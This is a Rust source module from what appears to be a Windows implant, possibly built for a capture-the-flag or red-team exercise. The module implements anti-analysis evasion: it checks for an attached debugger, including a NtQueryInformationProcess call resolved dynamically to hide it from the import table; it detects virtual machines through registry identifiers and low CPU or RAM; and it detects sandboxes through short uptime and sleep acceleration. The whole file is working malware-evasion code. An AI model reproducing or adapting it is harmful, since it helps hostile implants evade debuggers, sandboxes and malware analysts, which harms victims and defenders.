//! Anti-analysis techniques: debugger detection, VM detection,
//! and sandbox evasion.
//!
//! This module is only compiled on Windows.

#![cfg(target_os = "windows")]

use std::ffi::CString;
use windows_sys::Win32::Foundation::BOOL;
use windows_sys::Win32::System::Diagnostics::Debug::{CheckRemoteDebuggerPresent, IsDebuggerPresent};
use windows_sys::Win32::System::Threading::GetCurrentProcess;

// ============================================================================
// Debugger detection
// ============================================================================

/// Check if a debugger is attached using multiple methods.
pub fn is_debugger_present() -> bool {
    // Method 1: IsDebuggerPresent API
    if unsafe { IsDebuggerPresent() } != 0 {
        return true;
    }

    // Method 2: CheckRemoteDebuggerPresent
    let mut debugger: BOOL = 0;
    unsafe {
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut debugger);
    }
    if debugger != 0 {
        return true;
    }

    // Method 3: NtQueryInformationProcess (ProcessDebugPort = 7)
    // Resolved dynamically to avoid import table detection
    if check_debug_port() {
        return true;
    }

    false
}

/// Use NtQueryInformationProcess to check ProcessDebugPort.
fn check_debug_port() -> bool {
    unsafe {
        let ntdll = CString::new("ntdll.dll").unwrap();
        let func = CString::new("NtQueryInformationProcess").unwrap();

        let module = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(ntdll.as_ptr() as _);
        if module == 0 {
            return false;
        }

        let addr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(
            module,
            func.as_ptr() as _,
        );

        if let Some(nt_query) = addr {
            type NtQueryFn = unsafe extern "system" fn(
                isize, // ProcessHandle
                u32,   // ProcessInformationClass
                *mut usize,
                u32,
                *mut u32,
            ) -> i32;

            let nt_query: NtQueryFn = std::mem::transmute(nt_query);
            let mut debug_port: usize = 0;
            let status = nt_query(
                GetCurrentProcess(),
                7, // ProcessDebugPort
                &mut debug_port,
                std::mem::size_of::<usize>() as u32,
                std::ptr::null_mut(),
            );

            if status == 0 && debug_port != 0 {
                return true;
            }
        }
    }
    false
}

// ============================================================================
// VM detection
// ============================================================================

/// Check if the implant is running inside a virtual machine.
pub fn is_virtual_machine() -> bool {
    check_vm_registry() || check_low_resources()
}

/// Check registry for VM identifiers (VirtualBox, VMware).
fn check_vm_registry() -> bool {
    use windows_sys::Win32::System::Registry::*;

    let subkey = CString::new(
        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
    )
    .unwrap();

    let value_name = CString::new("Identifier").unwrap();

    unsafe {
        let mut key_handle: usize = 0;
        let result = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE as usize,
            subkey.as_ptr() as *const u8,
            0,
            KEY_READ,
            &mut key_handle as *mut usize as _,
        );

        if result != 0 {
            return false;
        }

        let mut buf = [0u8; 256];
        let mut buf_size: u32 = buf.len() as u32;

        let result = RegQueryValueExA(
            key_handle,
            value_name.as_ptr() as *const u8,
            std::ptr::null(),
            std::ptr::null_mut(),
            buf.as_mut_ptr(),
            &mut buf_size,
        );

        RegCloseKey(key_handle);

        if result != 0 {
            return false;
        }

        let id = String::from_utf8_lossy(&buf[..buf_size as usize]);
        let id_upper = id.to_uppercase();
        id_upper.contains("VBOX") || id_upper.contains("VMWARE") || id_upper.contains("QEMU")
    }
}

/// Check for suspiciously low CPU/RAM counts (common in analysis VMs).
fn check_low_resources() -> bool {
    unsafe {
        // Processor count
        let mut sys_info = std::mem::zeroed::<windows_sys::Win32::System::SystemInformation::SYSTEM_INFO>();
        windows_sys::Win32::System::SystemInformation::GetSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 2 {
            return true;
        }

        // RAM check (< 2 GB)
        let mut mem_info = std::mem::zeroed::<windows_sys::Win32::System::SystemInformation::MEMORYSTATUSEX>();
        mem_info.dwLength = std::mem::size_of::<windows_sys::Win32::System::SystemInformation::MEMORYSTATUSEX>() as u32;
        windows_sys::Win32::System::SystemInformation::GlobalMemoryStatusEx(&mut mem_info);
        if mem_info.ullTotalPhys < 2 * 1024 * 1024 * 1024 {
            return true;
        }
    }
    false
}

// ============================================================================
// Sandbox detection
// ============================================================================

/// Check for sandbox indicators: short uptime, sleep acceleration.
pub fn is_sandbox() -> bool {
    check_uptime() || check_sleep_acceleration()
}

/// Sandboxes typically have very short uptime.
fn check_uptime() -> bool {
    unsafe {
        let uptime = windows_sys::Win32::System::SystemInformation::GetTickCount();
        uptime < 600_000 // < 10 minutes
    }
}

/// Detect sleep acceleration (sandboxes skip or shorten Sleep calls).
fn check_sleep_acceleration() -> bool {
    unsafe {
        let start = windows_sys::Win32::System::SystemInformation::GetTickCount();
        windows_sys::Win32::System::Threading::Sleep(5000);
        let elapsed = windows_sys::Win32::System::SystemInformation::GetTickCount().wrapping_sub(start);
        elapsed < 4500
    }
}

// ============================================================================
// Master check
// ============================================================================

/// Run all anti-analysis checks. Returns `true` if analysis environment detected.
pub fn perform_all_checks() -> bool {
    if is_debugger_present() {
        return true;
    }
    // VM check is informational in CTF mode — uncomment to enforce
    // if is_virtual_machine() { return true; }
    if is_sandbox() {
        return true;
    }
    false
}
